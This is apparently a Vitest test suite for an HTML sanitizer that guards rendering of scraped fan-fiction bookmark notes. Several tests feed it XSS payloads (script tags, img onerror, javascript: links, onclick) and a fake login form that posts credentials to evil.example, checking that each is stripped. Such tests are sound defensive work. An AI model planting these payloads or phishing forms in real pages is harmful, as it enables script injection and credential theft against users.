import { describe, expect, it } from "vitest";
import { sanitizeHtml } from "./sanitizeHtml";

// sanitizeHtml is the SINGLE audited call site (docs/plans/bookmark-notes-
// feed.md §6, task T-02) through which every render of a bookmark's
// `noteHtml` must pass before reaching `dangerouslySetInnerHTML`. This is
// the load-bearing security test for the whole feature: `noteHtml` is raw,
// unsanitized, scraped AO3 HTML (backend's documented choice - see
// TECH_DEBT.md, 2026-08-01), so every malicious-payload case here MUST pass
// before BookmarkFeedItem renders a single real note.
//
// sanitizeHtml.ts does not exist yet (Testing precedes Implementation per
// this project's SDLC) - every test below is expected to fail on import
// alone until Implementation adds the module and the `dompurify` dependency
// (T-01).
describe("sanitizeHtml", () => {
  describe("null/empty input", () => {
    it("returns an empty string for null", () => {
      expect(sanitizeHtml(null)).toBe("");
    });

    it("returns an empty string for an empty string", () => {
      expect(sanitizeHtml("")).toBe("");
    });
  });

  describe("benign formatting is preserved", () => {
    it("preserves a <p> paragraph", () => {
      const result = sanitizeHtml("<p>Loved this fic!</p>");
      expect(result).toContain("<p>");
      expect(result).toContain("Loved this fic!");
    });

    it("preserves an <em> emphasis tag", () => {
      const result = sanitizeHtml("<p>This was <em>so</em> good.</p>");
      expect(result).toContain("<em>");
      expect(result).toContain("so");
    });

    it("preserves a plain <a> link's href", () => {
      const result = sanitizeHtml('<a href="https://example.com/fic">my other fic</a>');
      expect(result).toContain('href="https://example.com/fic"');
      expect(result).toContain("my other fic");
    });
  });

  describe("anchors get target=_blank rel=noopener noreferrer via the DOMPurify hook", () => {
    it("adds target and rel to a benign anchor", () => {
      const result = sanitizeHtml('<a href="https://example.com">link</a>');
      expect(result).toContain('target="_blank"');
      expect(result).toMatch(/rel="[^"]*noopener[^"]*"/);
      expect(result).toMatch(/rel="[^"]*noreferrer[^"]*"/);
    });
  });

  // The load-bearing test named explicitly in the plan (§6): a payload like
  // `<img src=x onerror=alert(1)>` and a `<script>` tag must be neutralized -
  // no `onerror`, no `<script>` - in the rendered output. Required, not
  // optional (plan's own wording).
  describe("malicious payloads are neutralized (T-02's required security test)", () => {
    it("strips a <script> tag entirely", () => {
      const result = sanitizeHtml('<p>hi</p><script>alert("xss")</script>');
      expect(result).not.toContain("<script");
      expect(result).not.toContain("alert(");
    });

    it("keeps the <img> element but drops the onerror handler", () => {
      const result = sanitizeHtml('<img src="x" onerror="alert(1)">');
      expect(result).toContain("<img");
      expect(result).not.toContain("onerror");
      expect(result).not.toContain("alert(1)");
    });

    it("strips a javascript: href from an anchor", () => {
      const result = sanitizeHtml('<a href="javascript:alert(1)">click me</a>');
      expect(result).not.toContain("javascript:");
    });

    it("strips an onclick handler from a benign-looking element", () => {
      const result = sanitizeHtml('<p onclick="alert(1)">click me</p>');
      expect(result).not.toContain("onclick");
      expect(result).not.toContain("alert(1)");
    });

    it("strips an <iframe>", () => {
      const result = sanitizeHtml('<iframe src="https://evil.example"></iframe>');
      expect(result).not.toContain("<iframe");
    });
  });

  // TECH_DEBT.md 2026-09-22 item 4 / 2026-09-14 Review finding: DOMPurify's
  // stock default already preserves broad semantic/structural HTML (verified
  // directly against the pre-change source before this config landed), so
  // these are about CODIFYING that intended behavior via an explicit config
  // rather than fixing an active defect - see the header comment for why an
  // explicit, documented config still matters even when the default already
  // agrees with it.
  describe("semantic/structural tags survive sanitization (explicit config, not just default behavior)", () => {
    it("preserves a <details>/<summary> spoiler-style collapsible section", () => {
      const result = sanitizeHtml(
        "<details><summary>Spoilers</summary><p>They kiss.</p></details>",
      );
      expect(result).toContain("<details>");
      expect(result).toContain("<summary>");
      expect(result).toContain("Spoilers");
      expect(result).toContain("They kiss.");
    });

    it("preserves a <blockquote>", () => {
      const result = sanitizeHtml("<blockquote>quoted text</blockquote>");
      expect(result).toContain("<blockquote>");
      expect(result).toContain("quoted text");
    });

    it("preserves list structures (<ul>/<ol>/<li>)", () => {
      const result = sanitizeHtml("<ul><li>one</li></ul><ol><li>two</li></ol>");
      expect(result).toContain("<ul>");
      expect(result).toContain("<ol>");
      expect(result).toContain("<li>one</li>");
      expect(result).toContain("<li>two</li>");
    });

    it("preserves <strong> and headings", () => {
      const result = sanitizeHtml("<h3>Title</h3><strong>bold</strong>");
      expect(result).toContain("<h3>");
      expect(result).toContain("<strong>");
    });

    it("preserves an <img> with a real src", () => {
      const result = sanitizeHtml('<img src="https://example.com/pic.png" alt="a cat">');
      expect(result).toContain('src="https://example.com/pic.png"');
      expect(result).toContain('alt="a cat"');
    });
  });

  // Newly-decided phishing-form closure (2026-09-14 Review finding, resolved
  // via TECH_DEBT.md's 2026-09-22 item 4 direction): these are RED against
  // the prior no-explicit-config implementation (DOMPurify's default
  // profile permits form/input/button/textarea/select), and must go GREEN
  // once FORBID_TAGS explicitly blocks them.
  describe("interactive form elements are stripped (phishing-form closure)", () => {
    it("strips a <form> and its action attribute", () => {
      const result = sanitizeHtml(
        '<form action="https://evil.example/steal"><p>Login below</p></form>',
      );
      expect(result).not.toContain("<form");
      expect(result).not.toContain("evil.example");
    });

    it("strips an <input>", () => {
      const result = sanitizeHtml('<input type="password" name="pw">');
      expect(result).not.toContain("<input");
    });

    it("strips a <button>", () => {
      const result = sanitizeHtml("<button>Submit</button>");
      expect(result).not.toContain("<button");
    });

    it("strips a <textarea>", () => {
      const result = sanitizeHtml("<textarea>hi</textarea>");
      expect(result).not.toContain("<textarea");
    });

    it("strips a <select>/<option>", () => {
      const result = sanitizeHtml("<select><option>a</option></select>");
      expect(result).not.toContain("<select");
      expect(result).not.toContain("<option");
    });

    it("strips a full fake-login form end to end, keeping no interactive remnants", () => {
      const result = sanitizeHtml(
        '<form action="https://evil.example/phish" method="post">' +
          '<input type="text" name="username" placeholder="AO3 username">' +
          '<input type="password" name="password" placeholder="Password">' +
          "<button>Log in</button></form>",
      );
      expect(result).not.toContain("<form");
      expect(result).not.toContain("<input");
      expect(result).not.toContain("<button");
    });
  });

  describe("malformed HTML is tolerated, never throws (plan §5)", () => {
    it("returns well-formed output for unclosed tags rather than throwing", () => {
      expect(() => sanitizeHtml("<p>unclosed paragraph <em>and emphasis")).not.toThrow();
      const result = sanitizeHtml("<p>unclosed paragraph <em>and emphasis");
      expect(result).toContain("unclosed paragraph");
    });

    it("returns well-formed output for garbage/non-HTML text, never throws", () => {
      expect(() => sanitizeHtml("<<<not really html>>>")).not.toThrow();
    });
  });
});
